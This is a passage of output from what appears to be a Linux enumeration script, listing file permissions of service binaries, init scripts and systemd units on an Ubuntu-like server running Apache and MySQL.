-rwxr-xr-x 1 root root   708648 Mar  8  2023 /usr/sbin/apache2
-rwxr-xr-x 1 root root    30728 Nov 12  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    55944 Feb 13  2020 /usr/sbin/cron
-rwxr-xr-x 1 root root    64432 Feb 13  2020 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root 67175512 Jun 14  2023 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   727248 May  3  2022 /usr/sbin/rsyslogd


[00;31m[-] /etc/init.d/ binary permissions:[00m
total 156
drwxr-xr-x   2 root root 4096 Jul 28  2023 .
drwxr-xr-x 104 root root 4096 Nov 23  2023 ..
-rwxr-xr-x   1 root root 2489 Feb 23  2021 apache-htcacheclean
-rwxr-xr-x   1 root root 8181 Feb 23  2021 apache2
-rwxr-xr-x   1 root root 3740 Apr  1  2020 apparmor
-rwxr-xr-x   1 root root 2915 Jun 29  2022 apport
-rwxr-xr-x   1 root root 1071 Jul 24  2018 atd
-rwxr-xr-x   1 root root 1232 Mar 27  2020 console-setup.sh
-rwxr-xr-x   1 root root 3059 Feb 11  2020 cron
-rwxr-xr-x   1 root root  937 Feb  4  2020 cryptdisks
-rwxr-xr-x   1 root root  896 Feb  4  2020 cryptdisks-early
-rwxr-xr-x   1 root root 3152 Sep 30  2019 dbus
-rwxr-xr-x   1 root root  985 Dec  2  2022 grub-common
-rwxr-xr-x   1 root root 3809 Jul 28  2019 hwclock.sh
-rwxr-xr-x   1 root root 2638 Dec 13  2019 irqbalance
-rwxr-xr-x   1 root root 1503 Nov  8  2018 iscsid
-rwxr-xr-x   1 root root 1479 Nov 27  2019 keyboard-setup.sh
-rwxr-xr-x   1 root root 2044 Feb 19  2020 kmod
-rwxr-xr-x   1 root root  695 Jan 28  2020 lvm2
-rwxr-xr-x   1 root root  586 Jan 28  2020 lvm2-lvmpolld
-rwxr-xr-x   1 root root 2827 Jan  9  2020 multipath-tools
-rwxr-xr-x   1 root root 5607 Jun 14  2023 mysql
-rwxr-xr-x   1 root root 2503 Mar 18  2021 open-iscsi
-rwxr-xr-x   1 root root 1846 Sep  8  2022 open-vm-tools
-rwxr-xr-x   1 root root 1366 Mar 23  2020 plymouth
-rwxr-xr-x   1 root root  752 Mar 23  2020 plymouth-log
-rwxr-xr-x   1 root root  924 Feb 13  2020 procps
-rwxr-xr-x   1 root root 4417 Aug 16  2022 rsync
-rwxr-xr-x   1 root root 2864 Mar  7  2019 rsyslog
-rwxr-xr-x   1 root root 1222 Apr  2  2017 screen-cleanup
-rwxr-xr-x   1 root root 3939 Apr  3  2023 ssh
-rwxr-xr-x   1 root root 6872 Apr 22  2020 udev
-rwxr-xr-x   1 root root 2083 Jan 21  2020 ufw
-rwxr-xr-x   1 root root 1391 Apr 25  2022 unattended-upgrades
-rwxr-xr-x   1 root root 1306 Feb  7  2022 uuidd


[00;31m[-] /etc/init/ config file permissions:[00m
total 16
drwxr-xr-x   2 root root 4096 Nov 23  2023 .
drwxr-xr-x 104 root root 4096 Nov 23  2023 ..
-rw-r--r--   1 root root  719 Oct 24  2023 amazon-ssm-agent.conf
-rw-r--r--   1 root root 1757 Jun 14  2023 mysql.conf


[00;31m[-] /lib/systemd/* config file permissions:[00m
/lib/systemd/:
total 8.7M
drwxr-xr-x 24 root root  36K Nov 23  2023 system
drwxr-xr-x  2 root root 4.0K Jul 28  2023 system-generators
drwxr-xr-x  2 root root 4.0K Jul 28  2023 system-shutdown
drwxr-xr-x  2 root root 4.0K Jul 28  2023 catalog
drwxr-xr-x  2 root root 4.0K Jul 28  2023 network
drwxr-xr-x  2 root root 4.0K Jul 28  2023 system-preset
drwxr-xr-x  4 root root 4.0K Jul 28  2023 user
drwxr-xr-x  2 root root 4.0K Jul 28  2023 user-environment-generators
drwxr-xr-x  2 root root 4.0K Jul 28  2023 user-preset
drwxr-xr-x  2 root root 4.0K Jul 28  2023 ntp-units.d
drwxr-xr-x  2 root root 4.0K Jul 28  2023 system-environment-generators
-rw-r--r--  1 root root 2.4M Mar 27  2023 libsystemd-shared-245.so
-rw-r--r--  1 root root  701 Mar 27  2023 resolv.conf
-rwxr-xr-x  1 root root 1.3K Mar 27  2023 set-cpufreq
-rwxr-xr-x  1 root root 1.6M Mar 27  2023 systemd
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-ac-power
-rwxr-xr-x  1 root root  27K Mar 27  2023 systemd-backlight
-rwxr-xr-x  1 root root  19K Mar 27  2023 systemd-binfmt
-rwxr-xr-x  1 root root  31K Mar 27  2023 systemd-bless-boot
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-boot-check-no-failures
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-cgroups-agent
-rwxr-xr-x  1 root root  35K Mar 27  2023 systemd-cryptsetup
-rwxr-xr-x  1 root root  23K Mar 27  2023 systemd-dissect
-rwxr-xr-x  1 root root  27K Mar 27  2023 systemd-fsck
-rwxr-xr-x  1 root root  31K Mar 27  2023 systemd-fsckd
-rwxr-xr-x  1 root root  23K Mar 27  2023 systemd-growfs
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-hibernate-resume
-rwxr-xr-x  1 root root  35K Mar 27  2023 systemd-hostnamed
-rwxr-xr-x  1 root root  19K Mar 27  2023 systemd-initctl
-rwxr-xr-x  1 root root 159K Mar 27  2023 systemd-journald
-rwxr-xr-x  1 root root  43K Mar 27  2023 systemd-localed
-rwxr-xr-x  1 root root 263K Mar 27  2023 systemd-logind
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-makefs
-rwxr-xr-x  1 root root  19K Mar 27  2023 systemd-modules-load
-rwxr-xr-x  1 root root  35K Mar 27  2023 systemd-network-generator
-rwxr-xr-x  1 root root 2.2M Mar 27  2023 systemd-networkd
-rwxr-xr-x  1 root root  31K Mar 27  2023 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  23K Mar 27  2023 systemd-pstore
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-quotacheck
-rwxr-xr-x  1 root root  23K Mar 27  2023 systemd-random-seed
-rwxr-xr-x  1 root root  19K Mar 27  2023 systemd-remount-fs
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-reply-password
-rwxr-xr-x  1 root root 407K Mar 27  2023 systemd-resolved
-rwxr-xr-x  1 root root  23K Mar 27  2023 systemd-rfkill
-rwxr-xr-x  1 root root  55K Mar 27  2023 systemd-shutdown
-rwxr-xr-x  1 root root  27K Mar 27  2023 systemd-sleep
-rwxr-xr-x  1 root root  31K Mar 27  2023 systemd-socket-proxyd
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-sulogin-shell
-rwxr-xr-x  1 root root  23K Mar 27  2023 systemd-sysctl
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-time-wait-sync
-rwxr-xr-x  1 root root  47K Mar 27  2023 systemd-timedated
-rwxr-xr-x  1 root root  55K Mar 27  2023 systemd-timesyncd
-rwxr-xr-x  1 root root 743K Mar 27  2023 systemd-udevd
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-update-utmp
-rwxr-xr-x  1 root root  23K Mar 27  2023 systemd-user-runtime-dir
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-user-sessions
-rwxr-xr-x  1 root root  15K Mar 27  2023 systemd-veritysetup
-rwxr-xr-x  1 root root  19K Mar 27  2023 systemd-volatile-root
drwxr-xr-x  2 root root 4.0K Mar 14  2023 logind.conf.d
drwxr-xr-x  2 root root 4.0K Mar 14  2023 system-sleep
drwxr-xr-x  3 root root 4.0K Mar 14  2023 boot
-rwxr-xr-x  1 root root 1.4K Feb 16  2022 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 22  2020 user-generators

/lib/systemd/system:
total 1.3M
-rw-r--r-- 1 root root  588 Oct 24  2023 amazon-ssm-agent.service
drwxr-xr-x 2 root root 4.0K Jul 28  2023 system-update.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 getty.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 timers.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Jul 28  2023 user-.slice.d
drwxr-xr-x 2 root root 4.0K Jul 28  2023 user@.service.d
-rw-r--r-- 1 root root  418 Jun 29  2023 cloud-config.service
-rw-r--r-- 1 root root  483 Jun 29  2023 cloud-final.service
-rw-r--r-- 1 root root  550 Jun 29  2023 cloud-init-local.service
-rw-r--r-- 1 root root  665 Jun 29  2023 cloud-init.service
-rw-r--r-- 1 root root  883 Jun 27  2023 cloud-config.target
-rw-r--r-- 1 root root  993 Jun 27  2023 cloud-init-hotplugd.service
-rw-r--r-- 1 root root  402 Jun 27  2023 cloud-init-hotplugd.socket
-rw-r--r-- 1 root root  517 Jun 27  2023 cloud-init.target
-rw-r--r-- 1 root root  830 Jun 27  2023 ua-reboot-cmds.service
-rw-r--r-- 1 root root  640 Jun 27  2023 ua-timer.service
-rw-r--r-- 1 root root  322 Jun 27  2023 ua-timer.timer
-rw-r--r-- 1 root root 1.4K Jun 27  2023 ubuntu-advantage.service
-rw-r--r-- 1 root root  741 Jun 20  2023 accounts-daemon.service
-rw-r--r-- 1 root root  529 Jun 14  2023 mysql.service
-rw-r--r-- 1 root root  747 May 30  2023 apt-news.service
-rw-r--r-- 1 root root  688 May 30  2023 esm-cache.service
-rw-r--r-- 1 root root  466 May 30  2023 fstrim.service
-rw-r--r-- 1 root root  205 May 30  2023 fstrim.timer
-rw-r--r-- 1 root root  538 May 30  2023 uuidd.service
-rw-r--r-- 1 root root  126 May 30  2023 uuidd.socket
-rw-r--r-- 1 root root  297 May 29  2023 snapd.aa-prompt-listener.service
-rw-r--r-- 1 root root  880 May 29  2023 snapd.apparmor.service
-rw-r--r-- 1 root root  432 May 29  2023 snapd.autoimport.service
-rw-r--r-- 1 root root  369 May 29  2023 snapd.core-fixup.service
-rw-r--r-- 1 root root  151 May 29  2023 snapd.failure.service
-rw-r--r-- 1 root root  144 May 29  2023 snapd.mounts-pre.target
-rw-r--r-- 1 root root  144 May 29  2023 snapd.mounts.target
-rw-r--r-- 1 root root  550 May 29  2023 snapd.recovery-chooser-trigger.service
-rw-r--r-- 1 root root  322 May 29  2023 snapd.seeded.service
-rw-r--r-- 1 root root  590 May 29  2023 snapd.service
-rw-r--r-- 1 root root  421 May 29  2023 snapd.snap-repair.service
-rw-r--r-- 1 root root  330 May 29  2023 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 May 29  2023 snapd.socket
-rw-r--r-- 1 root root  608 May 29  2023 snapd.system-shutdown.service
-rw-r--r-- 1 root root  406 May 11  2023 fwupd-offline-update.service
-rw-r--r-- 1 root root  450 May 11  2023 fwupd-refresh.service
-rw-r--r-- 1 root root  650 May 11  2023 fwupd.service
-rw-r--r-- 1 root root  212 Apr 13  2023 apport-autoreport.path
-rw-r--r-- 1 root root  242 Apr 13  2023 apport-autoreport.service
lrwxrwxrwx 1 root root    9 Apr  4  2023 sudo.service -> /dev/null
-rw-r--r-- 1 root root  184 Apr  3  2023 rescue-ssh.target
-rw-r--r-- 1 root root  538 Apr  3  2023 ssh.service
-rw-r--r-- 1 root root  216 Apr  3  2023 ssh.socket
-rw-r--r-- 1 root root  318 Apr  3  2023 ssh@.service
lrwxrwxrwx 1 root root   14 Mar 27  2023 autovt@.service -> getty@.service
-rw-r--r-- 1 root root 1.1K Mar 27  2023 console-getty.service
-rw-r--r-- 1 root root 1.3K Mar 27  2023 container-getty@.service
lrwxrwxrwx 1 root root    9 Mar 27  2023 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 27  2023 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Mar 27  2023 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Mar 27  2023 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Mar 27  2023 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Mar 27  2023 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   25 Mar 27  2023 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Mar 27  2023 debug-shell.service
lrwxrwxrwx 1 root root   16 Mar 27  2023 default.target -> graphical.target
-rw-r--r-- 1 root root  797 Mar 27  2023 emergency.service
-rw-r--r-- 1 root root  342 Mar 27  2023 getty-static.service
-rw-r--r-- 1 root root 2.0K Mar 27  2023 getty@.service
lrwxrwxrwx 1 root root    9 Mar 27  2023 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  716 Mar 27  2023 kmod-static-nodes.service
lrwxrwxrwx 1 root root   28 Mar 27  2023 kmod.service -> systemd-modules-load.service
-rw-r--r-- 1 root root  601 Mar 27  2023 modprobe@.service
-rw-r--r-- 1 root root  362 Mar 27  2023 ondemand.service
lrwxrwxrwx 1 root root   22 Mar 27  2023 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  609 Mar 27  2023 quotaon.service
-rw-r--r-- 1 root root  716 Mar 27  2023 rc-local.service
lrwxrwxrwx 1 root root    9 Mar 27  2023 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 27  2023 rcS.service -> /dev/null
-rw-r--r-- 1 root root  788 Mar 27  2023 rescue.service
lrwxrwxrwx 1 root root   15 Mar 27  2023 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Mar 27  2023 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Mar 27  2023 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Mar 27  2023 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Mar 27  2023 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Mar 27  2023 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Mar 27  2023 runlevel6.target -> reboot.target
-rw-r--r-- 1 root root 1.5K Mar 27  2023 serial-getty@.service
-rw-r--r-- 1 root root  830 Mar 27  2023 sys-kernel-config.mount
-rw-r--r-- 1 root root  719 Mar 27  2023 systemd-backlight@.service
-rw-r--r-- 1 root root 1.2K Mar 27  2023 systemd-binfmt.service
-rw-r--r-- 1 root root  678 Mar 27  2023 systemd-bless-boot.service
-rw-r--r-- 1 root root  718 Mar 27  2023 systemd-boot-check-no-failures.service
-rw-r--r-- 1 root root  740 Mar 27  2023 systemd-fsck-root.service
-rw-r--r-- 1 root root  741 Mar 27  2023 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Mar 27  2023 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Mar 27  2023 systemd-fsckd.socket
-rw-r--r-- 1 root root  671 Mar 27  2023 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  541 Mar 27  2023 systemd-hibernate.service
-rw-r--r-- 1 root root 1.2K Mar 27  2023 systemd-hostnamed.service
-rw-r--r-- 1 root root  813 Mar 27  2023 systemd-hwdb-update.service
-rw-r--r-- 1 root root  559 Mar 27  2023 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  566 Mar 27  2023 systemd-initctl.service
-rw-r--r-- 1 root root  686 Mar 27  2023 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.6K Mar 27  2023 systemd-journald.service
-rw-r--r-- 1 root root 1.5K Mar 27  2023 systemd-journald@.service
-rw-r--r-- 1 root root 1.2K Mar 27  2023 systemd-localed.service
-rw-r--r-- 1 root root 2.1K Mar 27  2023 systemd-logind.service
-rw-r--r-- 1 root root 1.1K Mar 27  2023 systemd-modules-load.service
-rw-r--r-- 1 root root  635 Mar 27  2023 systemd-network-generator.service
-rw-r--r-- 1 root root  740 Mar 27  2023 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 2.0K Mar 27  2023 systemd-networkd.service
-rw-r--r-- 1 root root 1.1K Mar 27  2023 systemd-pstore.service
-rw-r--r-- 1 root root  655 Mar 27  2023 systemd-quotacheck.service
-rw-r--r-- 1 root root 1.1K Mar 27  2023 systemd-random-seed.service
-rw-r--r-- 1 root root  767 Mar 27  2023 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.7K Mar 27  2023 systemd-resolved.service
-rw-r--r-- 1 root root  717 Mar 27  2023 systemd-rfkill.service
-rw-r--r-- 1 root root  596 Mar 27  2023 systemd-suspend-then-hibernate.service
-rw-r--r-- 1 root root  537 Mar 27  2023 systemd-suspend.service
-rw-r--r-- 1 root root  693 Mar 27  2023 systemd-sysctl.service
-rw-r--r-- 1 root root 1.2K Mar 27  2023 systemd-time-wait-sync.service
-rw-r--r-- 1 root root 1.2K Mar 27  2023 systemd-timedated.service
-rw-r--r-- 1 root root 1.5K Mar 27  2023 systemd-timesyncd.service
-rw-r--r-- 1 root root 1.2K Mar 27  2023 systemd-udevd.service
-rw-r--r-- 1 root root  797 Mar 27  2023 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  794 Mar 27  2023 systemd-update-utmp.service
-rw-r--r-- 1 root root  628 Mar 27  2023 systemd-user-sessions.service
-rw-r--r-- 1 root root  690 Mar 27  2023 systemd-volatile-root.service
lrwxrwxrwx 1 root root   21 Mar 27  2023 udev.service -> systemd-udevd.service
-rw-r--r-- 1 root root  688 Mar 27  2023 user-runtime-dir@.service
-rw-r--r-- 1 root root  748 Mar 27  2023 user@.service
lrwxrwxrwx 1 root root    9 Mar 27  2023 x11-common.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 14  2023 screen-cleanup.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Mar 14  2023 halt.target.wants
drwxr-xr-x 2 root root 4.0K Mar 14  2023 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Mar 14  2023 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Mar 14  2023 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Mar 14  2023 reboot.target.wants
-rw-r--r-- 1 root root  255 Feb 28  2023 rsync.service
-rw-r--r-- 1 root root  408 Dec 18  2022 grub-initrd-fallback.service
-rw-r--r-- 1 root root  583 Dec  2  2022 grub-common.service
lrwxrwxrwx 1 root root    9 Oct 31  2022 multipath-tools-boot.service -> /dev/null
lrwxrwxrwx 1 root root   18 Oct 31  2022 multipath-tools.service -> multipathd.service
-rw-r--r-- 1 root root  807 Oct 31  2022 multipathd.service
-rw-r--r-- 1 root root  186 Oct 31  2022 multipathd.socket
-rw-r--r-- 1 root root  505 Oct 25  2022 dbus.service
-rw-r--r-- 1 root root  106 Oct 25  2022 dbus.socket
-rw-r--r-- 1 root root  642 Sep 16  2022 bolt.service
-rw-r--r-- 1 root root  489 Sep  8  2022 open-vm-tools.service
-rw-r--r-- 1 root root  408 Sep  8  2022 vgauth.service
-rw-r--r-- 1 root root  194 Jul 25  2022 fwupd-refresh.timer
-rw-r--r-- 1 root root  438 Jun  2  2022 e2scrub@.service
-rw-r--r-- 1 root root  297 Jun  2  2022 e2scrub_all.service
-rw-r--r-- 1 root root  251 Jun  2  2022 e2scrub_all.timer
-rw-r--r-- 1 root root  245 Jun  2  2022 e2scrub_fail@.service
-rw-r--r-- 1 root root  550 Jun  2  2022 e2scrub_reap.service
-rw-r--r-- 1 root root  389 May 24  2022 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 May 24  2022 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  326 May 24  2022 apt-daily.service
-rw-r--r-- 1 root root  156 May 24  2022 apt-daily.timer
-rw-r--r-- 1 root root  258 May  4  2022 networkd-dispatcher.service
-rw-r--r-- 1 root root  435 May  3  2022 rsyslog.service
-rw-r--r-- 1 root root  603 Apr 26  2022 apache-htcacheclean.service
-rw-r--r-- 1 root root  612 Apr 26  2022 apache-htcacheclean@.service
-rw-r--r-- 1 root root  395 Apr 26  2022 apache2.service
-rw-r--r-- 1 root root  467 Apr 26  2022 apache2@.service
-rw-r--r-- 1 root root  377 Apr 25  2022 unattended-upgrades.service
-rw-r--r-- 1 root root  480 Apr  8  2022 ModemManager.service
-rw-r--r-- 1 root root  169 Sep  6  2021 clean-mount-point@.service
-rw-r--r-- 1 root root  203 Sep  6  2021 udisks2.service
-rw-r--r-- 1 root root  290 Aug 31  2021 thermald.service
-rw-r--r-- 1 root root  175 Mar 18  2021 iscsid.socket
-rw-r--r-- 1 root root  404 Feb  9  2021 pollinate.service
-rw-r--r-- 1 root root  987 Jan 19  2021 open-iscsi.service
-rw-r--r-- 1 root root  463 Jan 19  2021 iscsid.service
-rw-r--r-- 1 root root  447 Nov  2  2020 plymouth-halt.service
-rw-r--r-- 1 root root  461 Nov  2  2020 plymouth-kexec.service
lrwxrwxrwx 1 root root   27 Nov  2  2020 plymouth-log.service -> plymouth-read-write.service
-rw-r--r-- 1 root root  456 Nov  2  2020 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 Nov  2  2020 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 Nov  2  2020 plymouth-quit.service
-rw-r--r-- 1 root root  244 Nov  2  2020 plymouth-read-write.service
-rw-r--r-- 1 root root  449 Nov  2  2020 plymouth-reboot.service
-rw-r--r-- 1 root root  567 Nov  2  2020 plymouth-start.service
-rw-r--r-- 1 root root  291 Nov  2  2020 plymouth-switch-root.service
lrwxrwxrwx 1 root root   21 Nov  2  2020 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  525 Nov  2  2020 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  502 Nov  2  2020 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  481 Sep 28  2020 mdadm-grow-continue@.service
-rw-r--r-- 1 root root  210 Sep 28  2020 mdadm-last-resort@.service
-rw-r--r-- 1 root root  179 Sep 28  2020 mdadm-last-resort@.timer
-rw-r--r-- 1 root root  535 Sep 28  2020 mdcheck_continue.service
-rw-r--r-- 1 root root  435 Sep 28  2020 mdcheck_continue.timer
-rw-r--r-- 1 root root  483 Sep 28  2020 mdcheck_start.service
-rw-r--r-- 1 root root  463 Sep 28  2020 mdcheck_start.timer
-rw-r--r-- 1 root root 1.1K Sep 28  2020 mdmon@.service
-rw-r--r-- 1 root root  463 Sep 28  2020 mdmonitor-oneshot.service
-rw-r--r-- 1 root root  434 Sep 28  2020 mdmonitor-oneshot.timer
-rw-r--r-- 1 root root  388 Sep 28  2020 mdmonitor.service
-rw-r--r-- 1 root root  407 Sep 23  2020 packagekit-offline-update.service
-rw-r--r-- 1 root root  371 Sep 23  2020 packagekit.service
-rw-r--r-- 1 root root  396 Sep 10  2020 finalrd.service
-rw-r--r-- 1 root root  173 Jun 15  2020 motd-news.service
-rw-r--r-- 1 root root  161 Jun 15  2020 motd-news.timer
drwxr-xr-x 2 root root 4.0K Apr 22  2020 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel5.target.wants
-rw-r--r-- 1 root root 1.2K Apr 10  2020 apparmor.service
-rw-r--r-- 1 root root  919 Apr  1  2020 basic.target
-rw-r--r-- 1 root root  441 Apr  1  2020 blockdev@.target
-rw-r--r-- 1 root root  419 Apr  1  2020 bluetooth.target
-rw-r--r-- 1 root root  455 Apr  1  2020 boot-complete.target
-rw-r--r-- 1 root root  465 Apr  1  2020 cryptsetup-pre.target
-rw-r--r-- 1 root root  412 Apr  1  2020 cryptsetup.target
-rw-r--r-- 1 root root  750 Apr  1  2020 dev-hugepages.mount
-rw-r--r-- 1 root root  693 Apr  1  2020 dev-mqueue.mount
-rw-r--r-- 1 root root  471 Apr  1  2020 emergency.target
-rw-r--r-- 1 root root  541 Apr  1  2020 exit.target
-rw-r--r-- 1 root root  480 Apr  1  2020 final.target
-rw-r--r-- 1 root root  506 Apr  1  2020 getty-pre.target
-rw-r--r-- 1 root root  500 Apr  1  2020 getty.target
-rw-r--r-- 1 root root  598 Apr  1  2020 graphical.target
-rw-r--r-- 1 root root  527 Apr  1  2020 halt.target
-rw-r--r-- 1 root root  509 Apr  1  2020 hibernate.target
-rw-r--r-- 1 root root  530 Apr  1  2020 hybrid-sleep.target
-rw-r--r-- 1 root root  665 Apr  1  2020 initrd-cleanup.service
-rw-r--r-- 1 root root  528 Apr  1  2020 initrd-fs.target
-rw-r--r-- 1 root root  815 Apr  1  2020 initrd-parse-etc.service
-rw-r--r-- 1 root root  496 Apr  1  2020 initrd-root-device.target
-rw-r--r-- 1 root root  501 Apr  1  2020 initrd-root-fs.target
-rw-r--r-- 1 root root  584 Apr  1  2020 initrd-switch-root.service
-rw-r--r-- 1 root root  777 Apr  1  2020 initrd-switch-root.target
-rw-r--r-- 1 root root  813 Apr  1  2020 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  698 Apr  1  2020 initrd.target
-rw-r--r-- 1 root root  541 Apr  1  2020 kexec.target
-rw-r--r-- 1 root root  435 Apr  1  2020 local-fs-pre.target
-rw-r--r-- 1 root root  482 Apr  1  2020 local-fs.target
-rw-r--r-- 1 root root  445 Apr  1  2020 machine.slice
-rw-r--r-- 1 root root  532 Apr  1  2020 multi-user.target
-rw-r--r-- 1 root root  505 Apr  1  2020 network-online.target
-rw-r--r-- 1 root root  502 Apr  1  2020 network-pre.target
-rw-r--r-- 1 root root  521 Apr  1  2020 network.target
-rw-r--r-- 1 root root  554 Apr  1  2020 nss-lookup.target
-rw-r--r-- 1 root root  513 Apr  1  2020 nss-user-lookup.target
-rw-r--r-- 1 root root  394 Apr  1  2020 paths.target
-rw-r--r-- 1 root root  592 Apr  1  2020 poweroff.target
-rw-r--r-- 1 root root  417 Apr  1  2020 printer.target
-rw-r--r-- 1 root root  745 Apr  1  2020 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  718 Apr  1  2020 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  583 Apr  1  2020 reboot.target
-rw-r--r-- 1 root root  549 Apr  1  2020 remote-cryptsetup.target
-rw-r--r-- 1 root root  436 Apr  1  2020 remote-fs-pre.target
-rw-r--r-- 1 root root  522 Apr  1  2020 remote-fs.target
-rw-r--r-- 1 root root  492 Apr  1  2020 rescue.target
-rw-r--r-- 1 root root  540 Apr  1  2020 rpcbind.target
-rw-r--r-- 1 root root  442 Apr  1  2020 shutdown.target
-rw-r--r-- 1 root root  402 Apr  1  2020 sigpwr.target
-rw-r--r-- 1 root root  460 Apr  1  2020 sleep.target
-rw-r--r-- 1 root root  449 Apr  1  2020 slices.target
-rw-r--r-- 1 root root  420 Apr  1  2020 smartcard.target
-rw-r--r-- 1 root root  396 Apr  1  2020 sockets.target
-rw-r--r-- 1 root root  420 Apr  1  2020 sound.target
-rw-r--r-- 1 root root  577 Apr  1  2020 suspend-then-hibernate.target
-rw-r--r-- 1 root root  503 Apr  1  2020 suspend.target
-rw-r--r-- 1 root root  393 Apr  1  2020 swap.target
-rw-r--r-- 1 root root  823 Apr  1  2020 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  738 Apr  1  2020 sys-kernel-debug.mount
-rw-r--r-- 1 root root  764 Apr  1  2020 sys-kernel-tracing.mount
-rw-r--r-- 1 root root  558 Apr  1  2020 sysinit.target
-rw-r--r-- 1 root root 1.4K Apr  1  2020 syslog.socket
-rw-r--r-- 1 root root  434 Apr  1  2020 system-systemd-cryptsetup.slice
-rw-r--r-- 1 root root 1.4K Apr  1  2020 system-update-cleanup.service
-rw-r--r-- 1 root root  543 Apr  1  2020 system-update-pre.target
-rw-r--r-- 1 root root  617 Apr  1  2020 system-update.target
-rw-r--r-- 1 root root  722 Apr  1  2020 systemd-ask-password-console.path
-rw-r--r-- 1 root root  737 Apr  1  2020 systemd-ask-password-console.service
-rw-r--r-- 1 root root  650 Apr  1  2020 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  742 Apr  1  2020 systemd-ask-password-wall.service
-rw-r--r-- 1 root root 1.4K Apr  1  2020 systemd-boot-system-token.service
-rw-r--r-- 1 root root  556 Apr  1  2020 systemd-exit.service
-rw-r--r-- 1 root root  579 Apr  1  2020 systemd-halt.service
-rw-r--r-- 1 root root  546 Apr  1  2020 systemd-initctl.socket
-rw-r--r-- 1 root root  773 Apr  1  2020 systemd-journal-flush.service
-rw-r--r-- 1 root root 1.2K Apr  1  2020 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  597 Apr  1  2020 systemd-journald-varlink@.socket
-rw-r--r-- 1 root root  882 Apr  1  2020 systemd-journald.socket
-rw-r--r-- 1 root root  738 Apr  1  2020 systemd-journald@.socket
-rw-r--r-- 1 root root  592 Apr  1  2020 systemd-kexec.service
-rw-r--r-- 1 root root  728 Apr  1  2020 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  633 Apr  1  2020 systemd-networkd.socket
-rw-r--r-- 1 root root  556 Apr  1  2020 systemd-poweroff.service
-rw-r--r-- 1 root root  551 Apr  1  2020 systemd-reboot.service
-rw-r--r-- 1 root root  726 Apr  1  2020 systemd-rfkill.socket
-rw-r--r-- 1 root root  695 Apr  1  2020 systemd-sysusers.service
